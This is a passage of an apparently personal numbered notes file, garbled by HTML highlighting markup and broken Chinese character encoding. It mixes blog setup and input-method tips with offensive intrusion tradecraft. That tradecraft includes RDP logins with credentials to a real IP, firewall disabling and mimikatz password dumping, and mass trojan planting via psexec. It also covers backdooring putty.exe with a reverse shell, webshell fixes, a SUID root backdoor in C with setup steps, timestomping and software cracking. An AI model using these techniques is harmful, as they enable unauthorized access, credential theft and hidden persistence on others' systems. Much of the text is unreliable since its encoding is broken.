&lt;span class=&quot;p&quot;&gt;83.&lt;/span&gt;rdesktop -u administrator -p nihao103.240.203.6:3389
&lt;span class=&quot;p&quot;&gt;84.&lt;/span&gt;åˆ°æœ€å¤–é¢è°ƒæ—¶é—´,æ‹‰åˆ°ä¸­é—´æ²¡åˆ°æœ€å¤–é¢è°ƒæ˜ŸæœŸå’Œæ—¥æœŸ(ä¸­é—´æ—¶,é¡ºæ—¶é’ˆè°ƒæ˜ŸæœŸ,é€†æ—¶é’ˆè°ƒ  
   æ—¥æœŸ)
&lt;span class=&quot;p&quot;&gt;85.&lt;/span&gt;windows 2003,stop firewall service and policy command:net stop sharedaccess, net stop policyagent
   load  mimikatz
   mimikatz_command -f sekurlsa::searchPasswords
    -slave 103.240.203.6 200  202.177.192.16 3389
    local:-listen 
&lt;span class=&quot;p&quot;&gt;86.&lt;/span&gt;saæƒé™ä¸Šä¼ æ–‡ä»¶ä¹ç§æ–¹æ³•:http://www.csdn123.com/html/20130308/49/019024fd66e9a1a793e4344a6cc47175.htm
&lt;span class=&quot;p&quot;&gt;87.&lt;/span&gt;å†…ç½‘æ¸—é€:http://www.pojie567.com/blog/?post=5186
             http://www.1990day.com/regeorg-proxychains-gold-partner/
             http://www.codersec.net/%E5%AF%B9%E5%9B%BD%E5%A4%96%E6%9F%90%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%BB%93/
             http://netsecurity.51cto.com/art/201602/506072.htm ä½¿ç”¨Quarks PwDumpè·å–åŸŸæ§å¯†ç 
             https://www.91ri.org/tag/neiwang-hacker
             http://drops.wooyun.org/tips/6617   å¯¼å‡ºå½“å‰åŸŸå†…æ‰€æœ‰ç”¨æˆ·hashçš„æŠ€æœ¯æ•´ç†
             http://www.objectif-securite.ch/ophcrack.php   windows hashes crack
             http://cracer.com/?p=1247  æ‹¿ä¸‹åŸŸæ§åæ‰¹é‡ç§é©¬:psexec.exe @pc.txt -u ABIMAQ&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator -p k78m90 -c c:&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;av&lt;span class=&quot;se&quot;&gt;\2&lt;/span&gt;009.exe
             http://drops.wooyun.org/tips/12021   æ‹¿ä¸‹åŸŸæ§æƒé™
   å¿«é€Ÿæ‰¾å‡ºdc:
            dsquery server(best)
            nslookup -type=SRV _ldap._tcp.baidu.com
            netdom query fsmo
            net group &quot;domain controllers&quot; /domain
&lt;span class=&quot;p&quot;&gt;88.&lt;/span&gt;ipc$:http://www.cnblogs.com/lhws/p/4024208.htm
&lt;span class=&quot;p&quot;&gt;89.&lt;/span&gt;github pages+jekyllæ­å»ºä¸ªäººåšå®¢:
        https://www.zhihu.com/question/20223939
        https://github.com/jacobtomlinson/carte-noire
        http://www.tuicool.com/articles/RZbEV3
        https://help.github.com/articles/configuring-jekyll/
        https://help.github.com/articles/setting-up-your-github-pages-site-locally-with-jekyll/
        http://jekyllrb.com/docs/github-pages/#project-page-url-structure
        http://jekyllcn.com/
        https://learnetto.com/blog/tutorial-how-to-host-your-websites-for-free-using-github-pages
        http://pikipity.github.io/blog/kramdown-syntax-chinese-1.html   kramdownè¯­æ³•
        http://pikipity.github.io/blog/kramdown-syntax-chinese-2.html   kramdownè¯­æ³•
        http://platinhom.gitcafe.io/2015/11/06/Kramdown-note/           kramdownè¯­æ³•
        https://ruby-china.org/topics/14005                             webä¸­æ–‡å­—ä½“åº”ç”¨æŒ‡å—(i use æ–‡æ³‰é©¿ç­‰å®½æ­£é»‘ )
        http://platinhom.github.io/2015/06/06/Markdown-note/
        http://xinghuacai.github.io
        http://reyhan.org/2013/03/jekyll-archive-without-plugins.html   jekyll archive by year
        myblog/posts-by-categories.html                                 jekyll archive by categories
        http://www.ithome.com/html/it/195970.htm                        add music to my pages
&lt;span class=&quot;p&quot;&gt;90.&lt;/span&gt;kali2.0ä½¿ç”¨pptp vpnæ—¶,éœ€è¦åœ¨é«˜çº§é€‰é¡¹é‡Œå‹¾é€‰ä½¿ç”¨ç‚¹åˆ°ç‚¹åŠ å¯†,å¦‚æœè¿˜ä¸è¡Œåˆ™é€‰æ‹©æœ€å®‰å…¨çš„åŠ å¯†(128ä½),å¦åˆ™ä¸èƒ½æˆåŠŸè¿æ¥,å¦å¤–,ç”¨ä¸äº†l2tp vpn,ä¸çŸ¥ç³»ç»Ÿå“ªé‡Œçš„é—®é¢˜
&lt;span class=&quot;p&quot;&gt;91.&lt;/span&gt;https://ghostbin.com/  :-&amp;gt; paste? a site has article like:https://ghostbin.com/paste/6kho7?luicode=10000359
                                                             from:
                                                             http://drops.wooyun.org/pentesting/15117
&lt;span class=&quot;p&quot;&gt;92.&lt;/span&gt;kali2å®‰è£…rimeè¾“å…¥æ³•:https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
                       https://wu.nerd.moe/?p=1752
                       /usr/bin/rime_dict_managerè‡ªå¸¦è¯åº“ç®¡ç†å·¥å…·
                            kali_local:/root/.config/fcitx/rime/wubi86.userdb.kct
                            windows:%appdata%&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ime&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;ubi86.userdb.kct
                       http://www.jianshu.com/p/cffc0ea094a7
                       https://github.com/rime/home/wiki/CustomizationGuide
                       é‡æ–°éƒ¨ç½²ä½¿é…ç½®ç”Ÿæ•ˆ:---&amp;gt;    rm ~/.config/ibus/rime/default.yaml; ibus-daemon -drx&lt;span class=&quot;sb&quot;&gt;

                       pidof fcitx | xargs kill;pidof sogou-qimpanel | xargs kill;nohup fcitx  1&amp;gt;/dev/null 2&amp;gt;/dev/null &amp;amp;;nohup sogou-qimpanel  1&amp;gt;/dev/null 2&amp;gt;/dev/null &amp;amp;
                       emojiå¯¹åº”è¡¨:https://rimeime.googlecode.com/svn/trunk/artworks/schema/emoji-chart.png
                       æ–°å»ºdefault.custom.yaml,å†…å®¹ä¸ºpatch:...,æ„æ€æ˜¯è¦è¦†ç›–default.yamlä¸­é…ç½®,å…¶å®ƒå¦‚wubi_pinyin.yamlç­‰å¯¹åº”wubi_pinyin.custom.yaml
                       eg.my default.custom.yaml file:
                       ---------------------start------------------------
                            patch:
                                menu/page_size: 9
                                schema_list:
                                  - schema: luna_pinyin
                                  - schema: luna_pinyin_fluency
                                  - schema: luna_pinyin_simp
                                  - schema: wubi_pinyin
                                  - schema: wubi86
                                  - schema: emoji
                                ascii_composer:
                                  good_old_caps_lock: true
                                  switch_key:
                                    Caps_Lock: clear
                                    Control_L: noop
                                    Control_R: commit_text
                                    Eisu_toggle: clear
                                    Shift_L: commit_code
                                    Shift_R: inline_ascii
                      --------------------end----------------------------
    windowsä¸­rimeè¯åº“æ–‡ä»¶ä½ç½®:%APPDATA%\rime
    æ·±è“è¯åº“è½¬æ¢å·¥å…·:
                    https://github.com/studyzy/imewlconverter
                    http://www.cnblogs.com/studyzy/archive/2013/01/10/2855403.html

&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;93.&lt;/span&gt;windows download:https://www.microsoft.com/en-us/search/result.aspx?q=windows+xp+professional+x64+edition&amp;amp;form=MSHOME
&lt;span class=&quot;p&quot;&gt;94.&lt;/span&gt;backdoor-factoryç”¨æ³•:
&lt;span class=&quot;p&quot;&gt;    1.&lt;/span&gt;å•ç‹¬çš„backdoor-factory:backdoor-factory -f /root/Desktop/putty.exe -S (check if the putty.exe is support for backdoor-factory)
                             backdoor-factory -f /root/Desktop/putty.exe -s show (show usable kinds of reverse shell supported)
                             backdoor-factory -f /root/Desktop/putty.exe -s ...(... is a kind of shell from former &#39;show&#39; command) -H vps&#39;s ip -P 200
&lt;span class=&quot;p&quot;&gt;    2.&lt;/span&gt;backdoor-factory in veil:--&amp;gt;veil--&amp;gt;list--&amp;gt;number of native/backdoor-factory--&amp;gt;options--&amp;gt;set the options
&lt;span class=&quot;p&quot;&gt;95.&lt;/span&gt;aspxå¤§é©¬è¿æ¥æŠ¥é”™&quot;/&quot;è§£å†³æ–¹æ³•:http://www.asp-muma.com/?post=97
   my way defferent from uppon one:
   create a new folder,create a web.config file with below content:
   --------------------------content------------------------
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;system&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;customErrors&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;mode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Off&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;/system.web&amp;gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
   --------------------------end of content----------------
   then upon a strong webshell to my new created folder,found no more error.
&lt;span class=&quot;p&quot;&gt;96.&lt;/span&gt;ç™¾åº¦äº‘ä¸Šä¼ é™åˆ¶ç»•è¿‡:copy 1.rmvb /b + hunxiao.txt /a 1-hunxiao-txt.rmvb
&lt;span class=&quot;p&quot;&gt;97.&lt;/span&gt;windowsä¸­ping google &amp;amp;&amp;amp; ping baidu ==&amp;gt;ping.bat:
                                         cmd /k &quot;ping www.google.com.hk &amp;amp;&amp;amp; ping www.baidu.com&quot;
   åˆ›å»ºping.batæ–‡ä»¶çš„å¿«æ·æ–¹å¼,åœ¨å¿«æ·æ–¹å¼ä¸­æ·»åŠ å¿«æ·é”®.eg.ctrl+alt+p
&lt;span class=&quot;p&quot;&gt;98.&lt;/span&gt;linuxå¼€å¯httpä»£ç†:service squid3 status,service squid3 start,vi /etc/squid3/squid.conf default_port:3128
&lt;span class=&quot;p&quot;&gt;99.&lt;/span&gt;booklist:http://www.jianshu.com/p/67e294106919
&lt;span class=&quot;p&quot;&gt;100.&lt;/span&gt;gdb:http://www.jianshu.com/p/f20b10ea9a61
&lt;span class=&quot;p&quot;&gt;101.&lt;/span&gt;study links:
    http://www.shiyanbar.com/questions/733
    http://ch3rish.lofter.com/post/1d503b96_791362d
&lt;span class=&quot;p&quot;&gt;102.&lt;/span&gt;linuxä¸­suid,sgid,stickyè¯¦è§£:http://crazyming.blog.51cto.com/1048571/467414
    find / -type f -perm -4000 -ls &amp;gt; tmp.txt   function:find suid files
        find / -type f -perm -4000 -ls | grep &quot;flag00&quot; &amp;gt; tmp.txt    function:find file has setuid=flag00
    find / -type f -perm -2000 -ls &amp;gt; tmp.txt   function:find sgid files
    find / -perm -2 -type f -print             function:find files can be writeable by everyone
        echo &quot;/bin/cp /bin/sh /tmp/.sh;chmod 4755 /tmp/.sh&quot; &amp;gt;&amp;gt; writeable_file_if_it_is_from_any_autorun_directory
        /tmp/.sh -p(this command to get a euid=root shell)
&lt;span class=&quot;p&quot;&gt;103.&lt;/span&gt;linuxä¸­å¥½ç”¨çš„findå‘½ä»¤:http://www.oschina.net/translate/15-practical-unix-linux-find-command-examples-part-2?print
&lt;span class=&quot;p&quot;&gt;104.&lt;/span&gt;one linux backdoor shell can be like this:(file.c)
    #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;stdlib&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;unistd&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;string&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;sys&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;stdio&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    
    int main(int argc, char &lt;span class=&quot;gs&quot;&gt;**argv, char **&lt;/span&gt;envp)
    {
    	gid_t gid;
    	uid_t uid;
    	gid = getegid();
    	uid = geteuid();
    
    	setresgid(gid, gid, gid);
    	setresuid(uid, uid, uid);
    
    	system(&quot;/usr/bin/env echo &amp;amp;&amp;amp; echo runtime error.&quot;);
    }&lt;span class=&quot;sb&quot;&gt;

    to use this file as a root shell backdoor after got a root shell,
    use root role execute:
        gcc -o 1 file.c
        mv 1 /bin/l2ping
        chmod 4755 /bin/l2ping(or in common user: sudo chown root /bin/l2ping;sudo chmod +s /bin/l2ping)
    use webshell role execute:
        PATH=/tmp:$PATH
        export PATH
        echo $PATH(to check if /tmp is in $PATH)
        ln -s /bin/sh /tmp/echo
    then use webshell role to get a root privilege shell:
        /bin/l2ping
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;105.&lt;/span&gt;linuxä¸­ä¿®æ”¹æ–‡ä»¶æ—¶é—´
    åŒæ—¶ä¿®æ”¹æ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´å’Œè®¿é—®æ—¶é—´
    touch -d &quot;2010-05-31 08:10:30&quot; test.doc
&lt;span class=&quot;p&quot;&gt;106.&lt;/span&gt;rimeå…¨è§’åˆ°åŠè§’è§£å†³æ–¹æ³•:å¦‚æœä¸»æœºçªç„¶å˜æˆå…¨è§’è€Œæ— æ³•å˜å›åŠè§’,ä»ä»»æ„åœ°æ–¹ä¸­å¤åˆ¶ä¸€ä¸ªæ­£å¸¸çš„åŠè§’å­—ç¬¦ä¸²åˆ°ä¸»æœºä¸­ä»»æ„åœ°æ–¹å³å¯,ä¸ç”¨é‡å¯
&lt;span class=&quot;p&quot;&gt;107.&lt;/span&gt;sshæ–‡ä»¶å¤åˆ¶:eg.æœ¬æœºæœªç™»å½•å‰æ‰§è¡Œ
        scp level08@192.168.2.140:/home/level08/capture.pcap /1.pcap     (remote-&amp;gt;local)
        scp /tmp.txt level08@192.168.2.140:/home/level08/                (local-&amp;gt;remote)
&lt;span class=&quot;p&quot;&gt;108.&lt;/span&gt;echo &#39;ibase=16;410&#39; | bc 
        16è¿›åˆ¶çš„410è½¬æ¢æˆé»˜è®¤10è¿›åˆ¶:out-&amp;gt;1040
    echo &#39;ibase=16;obase=2;410&#39; | bc
        16è¿›åˆ¶çš„410è½¬æ¢æˆ2è¿›åˆ¶:out-&amp;gt;10000010000
&lt;span class=&quot;p&quot;&gt;109.&lt;/span&gt;pythonä¸­ordå’Œint:
    int(&#39;12&#39;)=12
    int(&#39;b&#39;)=error(intçš„å‚æ•°åªèƒ½æ˜¯&#39;num&#39;ç±»å‹)
    ord(&#39;b&#39;)=98
    ord(&#39;a&#39;)=97
    ord(&#39;0&#39;)=48
    ord(&#39;ascii&#39;)=asciiè¿™ä¸€ä¸ªå­—ç¬¦å¯¹åº”çš„åè¿›åˆ¶æ•´æ•°(asciiåªèƒ½æ˜¯a character,not string)
&lt;span class=&quot;p&quot;&gt;110.&lt;/span&gt;ä¹¦å•
        http://www.heysec.org/archives/257
        https://www.zhihu.com/question/24152689
        http://m.blog.csdn.net/article/details?id=45482849
&lt;span class=&quot;p&quot;&gt;111.&lt;/span&gt;linuxä¸Šsshæ— æ³•ä»¥rootç”¨æˆ·ç™»å½•è§£å†³æ–¹æ³•:
    vi /etc/ssh/sshd_config (attention!,here is not /etc/ssh/ssh_config)
    /PermitRootLogin&lt;span class=&quot;nt&quot;&gt;&amp;lt;Enter&amp;gt;&lt;/span&gt;
    change to:
        PermitRootLogin yes
&lt;span class=&quot;p&quot;&gt;112.&lt;/span&gt;gccç¼–è¯‘soæ–‡ä»¶:
        gcc -shared -fPIC myfile.c -o myfile.socc
&lt;span class=&quot;p&quot;&gt;113.&lt;/span&gt;wordpress æ¸—é€å·¥å…·
&lt;span class=&quot;p&quot;&gt;    1.&lt;/span&gt;wpscan
&lt;span class=&quot;p&quot;&gt;    2.&lt;/span&gt;http://www.getwpxf.com/  seems better
&lt;span class=&quot;p&quot;&gt;114.&lt;/span&gt;linuxä¸­cä»£ç ä¸­å¤šä¸ªå‚æ•°ä»£ç ç¼–å†™å‚è€ƒè§„èŒƒ:http://blackndoor.com/nebula-level18/
&lt;span class=&quot;p&quot;&gt;115.&lt;/span&gt;ä¸€ä¸ªåå…­è¿›åˆ¶ä½æ˜¯4bits,0x12345678æ˜¯32bits,ç›¸å½“äºä¸€ä¸ª32ä½ç³»ç»Ÿä¸‹çš„æ ˆå•å…ƒ
    ä¸€ä¸ªæ±‰å­—æ˜¯2ä¸ªå­—ç¬¦4ä¸ªå­—èŠ‚32ä½,4 bytes,32 bits
    ä¸€ä¸ªDWORDåˆ™æ˜¯4ä¸ªå­—ç¬¦8ä¸ªå­—èŠ‚64ä½,8 bytes,64 bits
&lt;span class=&quot;p&quot;&gt;116.&lt;/span&gt;linuxå®‰è£…ç¨‹åº
    cd program
    ./configure
    make
    sudo make install
&lt;span class=&quot;p&quot;&gt;117.&lt;/span&gt;linuxææƒæ—¶,ç¼–è¯‘exploit.cæ–‡ä»¶æ—¶å¿…é¡»åœ¨å¯¹æ–¹ç³»ç»Ÿä¸­ç¼–è¯‘,æˆ–è€…ä¸å¯¹æ–¹ç³»ç»Ÿä¸€æ ·çš„ç³»ç»Ÿä¸­ç¼–è¯‘,å¦åˆ™æœ¬åœ°ç¼–è¯‘å‡ºexploitæ–‡ä»¶åä¸Šä¼ åˆ°å¯¹æ–¹æœºå™¨è¿è¡Œæ—¶ä¼šå‡ºç°can not execute binary fileçš„é”™è¯¯
&lt;span class=&quot;p&quot;&gt;118.&lt;/span&gt;è®¿é—®ç›®å½•æ—¶,404ä¸ä»£è¡¨æ–‡ä»¶å¤¹ä¸€å®šä¸å­˜åœ¨,å°¤å…¶æ˜¯é‚£äº›ä¸æ ‡å‡†æ˜¾ç¤ºçš„404,æœ‰å¯èƒ½æ˜¯webappæˆ–wafæ•…æ„è¿™æ ·æ˜¾ç¤ºçš„,ä½†æ˜¯404æ˜¾ç¤ºç›®å½•ä¸‹çš„æ–‡ä»¶è¿˜æ˜¯å¯ä»¥æ­£å¸¸è®¿é—®çš„
&lt;span class=&quot;p&quot;&gt;119.&lt;/span&gt;c_++å¤´:
        using namespace std;
        #include &lt;span class=&quot;nt&quot;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;120.&lt;/span&gt;idaç ´è§£,æ›¿æ¢ida proæ ¹ç›®å½•ä¸‹çš„ida.keyä¸ºhttps://gist.github.com/TheCjw/9f6f7544f33f292db20eä¸‹çš„keyæ–‡ä»¶,ç„¶åå°†ç³»ç»Ÿæ—¶é—´æ”¹æˆ1å¹´ä»¥å‰ä¸‹çš„keyæ–‡ä»¶,ç„¶åå°†ç³»ç»Ÿæ—¶é—´æ”¹æˆ1å¹´ä»¥å‰
&lt;span class=&quot;p&quot;&gt;121.&lt;/span&gt;ROPå°±æ˜¯æ‰€è°“çš„Return Orientated Programming,æ—©æœŸä¹Ÿå«ret2libc.
&lt;span class=&quot;p&quot;&gt;122.&lt;/span&gt;htmlä¸­çš„å›¾æ ‡    http://fontawesome.io/icons/
&lt;span class=&quot;p&quot;&gt;123.&lt;/span&gt;fckeditorè®¾ç½®:hhttp://www.itpa.hk/ttp://www.jb51.net/article/17965.htm
&lt;span class=&quot;p&quot;&gt;124.&lt;/span&gt;htmlè½¬pdf:
    wkhtmltopdf www.myhomepage.com myhomepage.pdf
    åœ¨çº¿pdfç¼–è¾‘ http://www.pdfescape.com/
    æœ¬åœ°pdfå¿«é€Ÿè½¬æ¢:chromeæµè§ˆå™¨(å…¨é€‰æˆ–éƒ¨åˆ†é€‰æ‹©å)å³é”®å¯æ‰“å°æˆpdf
&lt;span class=&quot;p&quot;&gt;125.&lt;/span&gt;printf(&quot;%x&quot;):ç¬¬ä¸€ä¸ªæ ˆé‡Œçš„å€¼
    printf(&quot;%3x&quot;):ç¬¬ä¸€ä¸ªæ ˆé‡Œçš„å€¼,ç”¨3ä¸ªå­—èŠ‚é•¿åº¦è¡¨ç¤º
    printf(&quot;%3&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;x&quot;):ç¬¬ä¸‰ä¸ªæ ˆé‡Œçš„å€¼(è¿™ä¸€æ¡é€‚ç”¨äºç»å¤§å¤šæ•°çš„&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;nixçš„ç³»ç»Ÿ,winä¸‹ä¸æ”¯æŒåˆ™ç”¨printf(&quot;%x,%x,%x&quot;)æ¥è¾¾åˆ°åŒæ ·çš„ç›®çš„)
    å®½åº¦æ ¼å¼ç¬¦(%3)ä¸­çš„%å’Œ3æ˜¯ä¸åˆ†å¼€çš„,å¦‚æœ%3åé¢åŠ äº†&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;(ç›´æ¥å‚æ•°è®¿é—®)åˆ™è¡¨ç¤ºä¸ºæ‰“å°ç¬¬3ä¸ªæ ˆé‡Œçš„å€¼
&lt;span class=&quot;p&quot;&gt;126.&lt;/span&gt;visual studioå¿«é€Ÿç¼–è¯‘ä¸€ä¸ªcæ–‡ä»¶
    è¿è¡ŒC:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files (x86)&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;icrosoft Visual Studio 14.0&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;ommon7&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;ools&lt;span class=&quot;se&quot;&gt;\V&lt;/span&gt;sDevCmd.bat
    ç„¶åè¿è¡Œcl md.c
    æˆ–è€…æ‰“å¼€toolsé‡Œé¢çš„å¼€å‘äººå‘˜æç¤ºç¬¦,ç„¶åå†cl md.c
&lt;span class=&quot;p&quot;&gt;127.&lt;/span&gt;å®‰è£…sulleyè¿‡ç¨‹ä¸­é¦–å…ˆé€‰ç”¨ç®¡ç†å‘˜èº«ä»½å®‰è£…,å¦‚æœå¤±è´¥,å†æ‰‹åŠ¨å®‰è£…,å®‰è£…è¦æ±‚python2.4,å¦‚æœæœºå™¨ä¸Šå·²ç»å®‰è£…äº†pythonçš„å…¶ä»–ç‰ˆæœ¬,éœ€è¦äººå·¥å°†python2.4åŠ å…¥åˆ°ç¯å¢ƒå˜é‡ä¸­,å†å»sulley frameworkçš„å®‰è£…ç›®å½•ä¸‹ä¸­çš„install_filesä¸­å°†ctypeså’Œpcapyç”¨ç®¡ç†å‘˜èº«ä»½å®‰è£…
&lt;span class=&quot;p&quot;&gt;128.&lt;/span&gt;sulleyä¸­çš„process_monitor.pyä¸­ç”¨çš„æ˜¯os.systemæ¥å¯åŠ¨å´©æºƒçš„ç¨‹åºç»§ç»­fuzz,è¿™æ ·æ˜¯é˜»å¡æ–¹å¼,ä¸å¯ä»¥,å¯æ”¹æˆos.startfileæˆ–subprocessä¸­çš„popen
    os.startfile(ç›¸å½“äºåŒå‡»æ“ä½œ,eg. os.startfile(&quot;1.txt&quot;)):   http://blog.sina.com.cn/s/blog_4b5039210100froh.html
&lt;span class=&quot;p&quot;&gt;129.&lt;/span&gt;my_sulleyå­¦ä¹ èµ„æ–™
    http://pan.baidu.com/s/1c1Y6kVY
&lt;span class=&quot;p&quot;&gt;130.&lt;/span&gt;linuxä¸­æ‰¹é‡æ›¿æ¢ç›®å½•æ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸²:
    sed -i &quot;s/xinghuacai/3xp10it/g&quot; &lt;span class=&quot;sb&quot;&gt;`grep xinghuacai -rl .`&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;131.&lt;/span&gt;githubåœ¨pushæ—¶å…è¾“å…¥ç”¨æˆ·åå¯†ç :
    http://www.cnblogs.com/ballwql/p/3462104.html
&lt;span class=&quot;p&quot;&gt;132.&lt;/span&gt;mysqlä¸­è¡¨åä¸ºå…³é”®å­—çš„å¤„ç†æ–¹æ³•,&lt;span class=&quot;sb&quot;&gt;`table_name`&lt;/span&gt;
    http://www.cnblogs.com/puzi0315/archive/2012/08/27/2658169.html
&lt;span class=&quot;p&quot;&gt;133.&lt;/span&gt;windowsæˆªå›¾ç¥å™¨Snipaste
    http://zh.snipaste.com/
&lt;span class=&quot;p&quot;&gt;134.&lt;/span&gt;windowsä¸‹rimeä¿®æ”¹å¤‡é€‰è¯ä¸ªæ•°:æ‰“å¼€default.yaml,ä¿®æ”¹å¯¹åº”æ•°å­—
&lt;span class=&quot;p&quot;&gt;135.&lt;/span&gt;ranger:linux terminal file manage god software
&lt;span class=&quot;p&quot;&gt;136.&lt;/span&gt;github pagesç”Ÿæˆçš„åšå®¢æœ¬åœ°æœ‰è¯­æ³•é«˜äº®è€Œæ­£å¸¸http://3xp10it.github.ioæ²¡æœ‰è¯­æ³•é«˜äº®çš„åŸå› :
    ç”±äºgithubå°†åšå®¢å‡çº§æˆhttps://3xp10it.github.io,è€Œæœ¬åœ°æµè§ˆå™¨è®¿é—®https://3xp10it.github.ioæ—¶,å‡ºäºå®‰å…¨æ€§è€ƒè™‘,ç¦ç”¨äº†js
    æœ¬åœ°ç”Ÿæˆçš„åšå®¢ä¸ºhttp://127.0.0.1:4000,æ²¡æœ‰https
    è§£å†³åŠæ³•:https://help.github.com/articles/securing-your-github-pages-site-with-https/
        å°†åšå®¢æ–‡ä»¶å¤¹ä¸­çš„httpså˜æˆhttp
        (åæ¥å¥½åƒæ˜¯åªè¦æŠŠcssæ–‡ä»¶ä¸­çš„httpå˜æˆhttpså°±å¯ä»¥?)
&lt;span class=&quot;p&quot;&gt;137.&lt;/span&gt;ç»ˆç«¯å­—ç¬¦ä¸²ç”Ÿæˆå›¾åƒå·¥å…·
    banner
    figlet
    toilet
    http://blog.chinaunix.net/uid-10540984-id-2881092.html
    https://xin053.github.io/2016/07/06/pyfiglet%E5%BA%93%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/
&lt;span class=&quot;p&quot;&gt;138.&lt;/span&gt;bind shift+e to firefox&#39;s perference shortcut key bind
&lt;span class=&quot;p&quot;&gt;139.&lt;/span&gt;åˆ¶ä½œpypiçš„pythonæ¨¡å—(eg.exp10it.py)æ—¶,åœ¨æœ¬åœ°å¦‚æœexp10it.pyä¸­æœ‰ä¸­æ–‡,åœ¨ä¸€ä¸ªæ­£å¸¸çš„pyæ–‡ä»¶ä¸­å¦‚æœæœ‰ä¸€å¥from exp10it import &lt;span class=&quot;ge&quot;&gt;*,å¦‚æœè¿™ä¸ªæ­£å¸¸çš„pyæ–‡ä»¶ä¸­ç”±äºè¿™å¥å¯¼å…¥äº†ç›¸åŒæ–‡ä»¶å¤¹ç›®å½•ä¸‹çš„exp10it.pyæ¨¡å—,ä¼šç”±äºå…¶ä¸­çš„ä¸­æ–‡è€Œäº§ç”Ÿé”™è¯¯,å¯ä»¥ä¸Šä¼ åˆ°pypiåç”±pip installå®‰è£…exp10itæ¨¡å—åä½¿ç”¨from exp10it import *&lt;/span&gt;,åŒæ—¶éœ€è¦åˆ é™¤åŒç›®å½•ä¸‹çš„exp10it.pyæ–‡ä»¶,å¦åˆ™from exp10it import &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;ä¾ç„¶ä¼šä¼˜å…ˆä»åŒç›®å½•ä¸‹æ‰¾exp10it.pyæ¨¡å—
&lt;span class=&quot;p&quot;&gt;140.&lt;/span&gt;sqlmapå¾—å‡ºç»éªŒ,ä¸€èˆ¬è·‘å‡ºåªæœ‰ç›²æ³¨çš„uriæ³¨å…¥ç‚¹,ä¸€èˆ¬éƒ½æ˜¯ç”±äºwafæ‹¦æˆªäº†æ™®é€šçš„unionæ³¨å…¥è¯­å¥,åªè¦æƒ³åŠæ³•ç»•è¿‡wafå°±å¯ä»¥ç”¨unionæ¥å¿«é€Ÿæ³¨å…¥äº†,å¦åˆ™åªèƒ½ç”¨sqlmapè·‘å‡ºæ¥çš„ç›²æ³¨payloadè¿›è¡Œæ…¢æ…¢çš„æ³¨å…¥,ä¸”æœ‰å¯èƒ½ä¸èƒ½æ³¨å…¥å‡ºæ‰€æœ‰æ•°æ®,ä¾ç„¶è¢«wafæ‹¦æˆª
&lt;span class=&quot;p&quot;&gt;151.&lt;/span&gt;pythonæ¨¡å—ä¸­å£°æ˜ç¼–ç ä¸ºutf-8çš„æ³¨é‡Šä»£ç ä¸ç”¨æ”¾åœ¨å‰ä¸¤è¡Œ,å¦‚æœå‡ºé”™,è¯´æ˜ä»£ç å…¶ä»–åœ°æ–¹æœ‰è¯¯
&lt;span class=&quot;p&quot;&gt;152.&lt;/span&gt;compizå’Œunityçš„é—®é¢˜:
    dconf reset -f /org/compiz
    setsid unity
    unity --reset-icons&lt;span class=&quot;sb&quot;&gt;

    another:
    cd 
